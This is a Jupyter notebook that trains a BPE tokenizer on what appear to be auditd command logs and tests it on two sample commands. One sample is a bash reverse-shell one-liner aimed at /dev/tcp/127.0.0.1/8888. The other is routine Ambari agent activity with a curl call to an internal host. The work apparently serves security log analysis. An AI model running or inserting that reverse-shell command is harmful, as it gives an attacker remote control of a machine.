{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sentencepiece as spm\n",
    "\n",
    "# All training options: https://github.com/google/sentencepiece/blob/master/doc/options.md\n",
    "# non-default options: \n",
    "#   --split_by_number=false\n",
    "spm.SentencePieceTrainer.Train(rf'''--input=auditd_total.cm --model_prefix=auditd --vocab_size=1024 --model_type=bpe --split_by_number=false''')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['▁/', 'usr', '/', 'bin', '/', 'bash', '▁-', 'i', '▁>&', '▁/', 'dev', '/', 'tcp', '/127.0.0.1/', '8888', '▁0>&1']\n",
      "[24, 30, 939, 15, 939, 43, 6, 947, 68, 24, 210, 939, 257, 277, 192, 513]\n",
      "['▁/', 'bin', '/', 'bash', '▁/', 'var', '/', 'lib', '/', 'ambari', '-', 'agent', '/', 'ambari', '-', 'su', 'do', '.', 'sh', '▁su', '▁', 'ambari', '-', 'qa', '▁-', 'l', '▁-', 's', '▁/', 'bin', '/', 'bash', '▁-', 'c', '▁export', '▁PATH', '=/', 'usr', '/', 'local', '/', 'sbin', ':/', 'usr', '/', 'local', '/', 'bin', ':/', 'usr', '/', 'sbin', ':/', 'usr', '/', 'bin', ':/', 'sbin', ':/', 'bin', ':/', 'usr', '/', 'games', ':/', 'usr', '/', 'local', '/', 'games', ':/', 'snap', '/', 'bin', ':/', 'var', '/', 'lib', '/', 'ambari', '-', 'agent', '▁;', '▁curl', '▁-', 's', '▁-', 'o', '▁/', 'dev', '/', 'null', '▁-', 'w', \"'\", '%{', 'http', '_', 'code', \"}'\", '▁--', 'ne', 'g', 'oti', 'ate', '▁-', 'u', ':', '▁-', 'k', '▁http', '://', 'hn1-', 'hdi', '_', 'NUMBER', '_.', 'q', '55', 'm', 'q', 'v', '1', 'n', 'ml', '3', 'eb', 'b', '0', 'r', '30', 'z', 'p', 'h', 'k', 'cl', 'w', 'c', '.', 'cx', '.', 'internal', '.', 'cloudapp', '.', 'net', ':_', 'NUMBER', '_/', 's', 'es', 'sion', 's', '▁|', '▁grep', '▁_', 'NUMBER', '_']\n",
      "[24, 15, 939, 43, 24, 112, 939, 134, 939, 312, 955, 514, 939, 312, 955, 626, 591, 937, 7, 618, 936, 312, 955, 887, 6, 964, 6, 938, 24, 15, 939, 43, 6, 953, 328, 672, 549, 30, 939, 149, 939, 263, 80, 30, 939, 149, 939, 15, 80, 30, 939, 263, 80, 30, 939, 15, 80, 263, 80, 15, 80, 30, 939, 428, 80, 30, 939, 149, 939, 428, 80, 676, 939, 15, 80, 112, 939, 134, 939, 312, 955, 514, 506, 805, 6, 938, 6, 945, 24, 210, 939, 495, 6, 983, 967, 919, 313, 975, 851, 430, 131, 438, 976, 895, 597, 6, 958, 991, 6, 971, 605, 388, 759, 395, 975, 75, 493, 997, 375, 965, 997, 979, 941, 944, 725, 970, 730, 957, 942, 946, 174, 990, 943, 952, 971, 93, 983, 953, 937, 434, 937, 165, 937, 169, 937, 111, 488, 75, 139, 938, 199, 653, 938, 91, 551, 344, 75, 975]\n"
     ]
    }
   ],
   "source": [
    "sp = spm.SentencePieceProcessor(model_file='auditd.model')\n",
    "s0 = \"/usr/bin/bash -i >& /dev/tcp/127.0.0.1/8888 0>&1\"\n",
    "s1 = \"/bin/bash /var/lib/ambari-agent/ambari-sudo.sh su ambari-qa -l -s /bin/bash -c export  PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/var/lib/ambari-agent ; curl -s -o /dev/null -w'%{http_code}' --negotiate -u: -k http://hn1-hdi_NUMBER_.q55mqv1nml3ebb0r30zphkclwc.cx.internal.cloudapp.net:_NUMBER_/sessions | grep _NUMBER_ \"\n",
    "ss = [s0, s1]\n",
    "for s in ss:\n",
    "    print(sp.encode_as_pieces(s))\n",
    "    print(sp.encode_as_ids(s))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.13 64-bit (microsoft store)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "4e123ac7eba4d44924a894b1be2fc564282b1d2645e9d64ed33bc5003b6c2a87"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
